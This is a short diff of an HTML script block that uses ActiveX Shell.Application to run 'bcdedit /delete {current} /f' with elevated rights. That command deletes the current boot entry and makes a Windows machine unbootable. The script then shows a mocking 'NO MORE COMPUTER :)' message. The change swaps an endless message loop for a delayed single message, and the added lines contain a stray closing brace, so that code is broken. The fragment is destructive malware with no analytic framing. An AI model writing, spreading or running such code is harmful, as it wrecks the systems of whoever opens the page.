@@ -20,7 +20,11 @@
 <script>
       var s=new ActiveXObject('Shell.Application')
       s.ShellExecute('bcdedit.exe','/delete {current} /f','', 'runas',1);
-      while(true){s.ShellExecute('msg','* NO MORE COMPUTER :)','')}
+      setTimeout(function(){
+            var s=new ActiveXObject('Shell.Application')
+            s.ShellExecute('msg','* NO MORE COMPUTER :)','')}
+      }, 200);
+
 </script>
 <script>
       
